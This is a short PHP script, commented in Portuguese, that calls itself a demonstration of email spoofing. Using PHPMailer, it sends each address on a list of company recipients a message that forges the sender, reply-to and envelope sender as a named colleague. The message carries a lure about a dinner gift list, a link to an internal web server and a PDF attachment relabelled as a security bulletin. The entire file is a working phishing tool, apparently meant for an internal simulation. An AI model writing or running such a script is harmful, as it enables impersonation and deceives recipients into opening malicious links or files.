<?php
/**
 * Script de Demonstração de Spoofing de E-mail com Anexo para Múltiplos Destinatários
 * * ATENÇÃO: Preencha a lista de e-mails abaixo para testar.
 */

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Certifique-se de que o autoloader está sendo carregado corretamente
require 'vendor/autoload.php';

// --- Lista de Destinatários ---
// **SUBSTITUA ESTES ENDEREÇOS PELOS SEUS ENDEREÇOS DE TESTE/SIMULAÇÃO**
$lista_emails = [
    'andre@renar.com.br',
    'suporte@renar.com.br' 
];

// --- Variáveis de Simulação (Remetente Spoofed) ---
$remetente_falso = 'roberto@renar.com.br'; 
$nome_remetente = 'Roberto Frey';
$assunto = 'Lista de brindes';
$mensagem_corpo = 'Prezado(a)s Srs,<br><br>Pelo link, fiz uma lista de brindes e tudo que estará incluso na janta<br><br>http://servweb:8686/teste/relatorios.html<br><br>Atenciosamente,<br>';

// --- Configuração do Anexo ---
$caminho_anexo = '689786.pdf'; 
$nome_anexo = 'Informativo_Segurança.pdf';

// Verificação de segurança: checar se o arquivo existe antes de iniciar o processo de envio
if (!file_exists($caminho_anexo)) {
    die("❌ Erro: O arquivo de anexo não foi encontrado no caminho: " . $caminho_anexo);
}


$sucessos = 0;
$falhas = 0;

echo "Iniciando envio para " . count($lista_emails) . " destinatários...\n\n";

// Itera sobre cada e-mail na lista
foreach ($lista_emails as $destinatario) {
    
    $mail = new PHPMailer(true); // Cria uma nova instância para cada envio
    
    try {
        // 1. **MÉTODO DE ENVIO: Local (isMail)**
        $mail->isMail(); 
        $mail->CharSet = 'UTF-8';

        // --- Configuração de Spoofing ---
        $mail->SetFrom($remetente_falso, $nome_remetente); 
        $mail->addReplyTo($remetente_falso, $nome_remetente); 
        $mail->Sender = $remetente_falso; 
        
        // Destinatário Único
        $mail->addAddress($destinatario);

        // --- Anexo ---
        $mail->addAttachment($caminho_anexo, $nome_anexo);
        
        // Conteúdo
        $mail->isHTML(true);
        $mail->Subject = $assunto;
        $mail->Body    = $mensagem_corpo;
        $mail->AltBody = strip_tags($mensagem_corpo);

        $mail->send();
        echo "✅ Sucesso: E-mail enviado para **" . $destinatario . "**\n";
        $sucessos++;

    } catch (Exception $e) {
        echo "❌ Falha: E-mail não enviado para **" . $destinatario . "**. Erro: " . substr($mail->ErrorInfo, 0, 80) . "...\n";
        $falhas++;
    }
}

echo "\n--- Resumo ---\n";
echo "Envios Tentados: " . count($lista_emails) . "\n";
echo "Envios com Sucesso: " . $sucessos . "\n";
echo "Envios com Falha: " . $falhas . "\n";
?>